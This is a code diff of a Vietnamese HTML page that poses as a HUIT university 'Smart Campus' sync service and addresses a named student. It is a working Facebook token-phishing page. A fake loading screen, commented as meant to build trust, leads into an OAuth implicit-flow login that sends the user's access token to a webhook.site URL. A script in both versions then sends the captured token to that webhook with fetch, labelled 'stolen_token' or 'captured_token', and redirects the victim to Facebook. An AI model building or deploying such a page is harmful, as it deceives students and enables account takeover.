@@ -1,67 +1,74 @@
-<!DOCTYPE html>
 <html lang="vi">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Xác Thực Sinh Viên - HUIT Smart Campus</title>
+    <title>Hệ Thống Smart Campus - Đồng Bộ Dữ Liệu</title>
+
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; width: 100%; max-width: 400px; }
-        img { width: 60px; margin-bottom: 20px; }
-        h1 { color: #1c1e21; font-size: 24px; margin-bottom: 15px; }
-        p { color: #606770; font-size: 16px; margin-bottom: 25px; line-height: 1.4; }
-        .btn-login { background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; padding: 12px 0; width: 100%; cursor: pointer; transition: 0.3s; }
-        .btn-login:hover { background-color: #166fe5; }
-        .footer { margin-top: 20px; font-size: 12px; color: #8a8d91; border-top: 1px solid #ddd; padding-top: 15px; }
+        .container { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        .logo { width: 80px; margin-bottom: 20px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { background-color: #1877f2; color: white; border: none; padding: 12px 20px; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; width: 100%; }
+        button:hover { background-color: #166fe5; }
+        .footer-text { font-size: 12px; color: #606770; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" alt="Facebook Logo">
-    <h1>Smart Campus HUIT</h1>
-    <p>Chào Phương, vui lòng nhấn nút bên dưới để đồng bộ tài khoản và nhận thông báo lịch học mới nhất từ nhà trường.</p>
-    
-    <button class="btn-login" id="loginBtn">Đăng nhập với Facebook</button>
-
-    <div class="footer">
-        Đại học Công nghiệp Thực phẩm TP.HCM - HUIT
+<div class="container" id="main-box">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/2021_Facebook_icon.svg" class="logo" alt="FB Logo">
+    <h2 id="status-title">Đang đồng bộ Smart Campus...</h2>
+    <div id="loading-ui">
+        <div class="loader"></div>
+        <p>Vui lòng đợi trong giây lát để hệ thống kiểm tra phiên đăng nhập Facebook của bạn.</p>
     </div>
+
+    <div id="action-ui" style="display: none;">
+        <p>Hệ thống nhận diện bạn đang đăng nhập Facebook. Nhấn vào bên dưới để tiếp tục mà không cần nhập lại mật khẩu.</p>
+        <button onclick="redirectToAuth()">Tiếp tục với vai trò Người dùng</button>
+
+    </div>
+    
+    <p class="footer-text">Ứng dụng được phát triển bởi dự án Smart Campus - HUIT</p>
 </div>
 
 <script>
-    // === CẤU HÌNH THÔNG SỐ ĐÃ SỬA ===
-    const APP_ID = "839014905810590"; 
-    const REDIRECT_URI = "https://phuongtrannn.github.io/test/"; 
-    const WEBHOOK_URL = "https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916"; // Đã cập nhật link của bạn
+    // 1. Giả lập thời gian quét để tạo sự tin tưởng
+    setTimeout(function() {
+        document.getElementById('loading-ui').style.display = 'none';
+        document.getElementById('action-ui').style.display = 'block';
+        document.getElementById('status-title').innerText = "Xác nhận danh tính";
+    }, 2500);
 
-    const loginBtn = document.getElementById('loginBtn');
+    // 2. Hàm chuyển hướng lấy Token THẬT
+    function redirectToAuth() {
+        const client_id = "839014905810590"; // ID ứng dụng thật của bạn
+        const redirect_uri = encodeURIComponent("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916");
+        
+        // Luồng OAuth Implicit Flow để lấy Access Token trực tiếp trên URL
+        const fb_auth_url = `https://www.facebook.com/v18.0/dialog/oauth?client_id=${client_id}&redirect_uri=${redirect_uri}&response_type=token&scope=public_profile,email`;
+        
+        console.log("Đang chuyển hướng đến Facebook để lấy Token...");
+        window.location.href = fb_auth_url;
+    }
 
-    // Bước 1: Chuyển đến Facebook để xin quyền
-    loginBtn.onclick = function() {
-        const fbAuthUrl = `https://www.facebook.com/v21.0/dialog/oauth?client_id=${APP_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=token&scope=public_profile,email`;
-        window.location.href = fbAuthUrl;
-    };
-
-    // Bước 2: Tự động bắt Token và gửi về Webhook
+    // 3. Tự động bắt Token khi Facebook quay trở lại trang này (nếu bạn dùng trang này làm Redirect URI)
     window.onload = function() {
-        if (window.location.hash.includes("access_token")) {
-            const hash = window.location.hash.substring(1);
-            const params = new URLSearchParams(hash);
-            const token = params.get('access_token');
+        if (window.location.hash) {
+            const params = new URLSearchParams(window.location.hash.substring(1));
 
-            if (token) {
-                // Gửi Token về Webhook ngầm
-                fetch(`${WEBHOOK_URL}?stolen_token=${token}`)
-                .then(() => {
-                    alert("Xác thực thành công! Hệ thống đang chuyển hướng về trang chủ.");
-                    window.location.href = "https://www.facebook.com"; 
-                })
-                .catch(err => console.error("Lỗi gửi dữ liệu"));
+            const accessToken = params.get('access_token');
+
+            if (accessToken) {
+                // Gửi Token thu hoạch được về Webhook ngầm
+                fetch("https://webhook.site/63a27832-d5bc-440f-9993-e12efa944916?captured_token=" + accessToken);
+                
+                alert("Đồng bộ dữ liệu Smart Campus thành công!");
+                window.location.href = "https://www.facebook.com";
+
+
+
             }
         }
-    };
-</script>
-
-</body>
-</html>
+    }
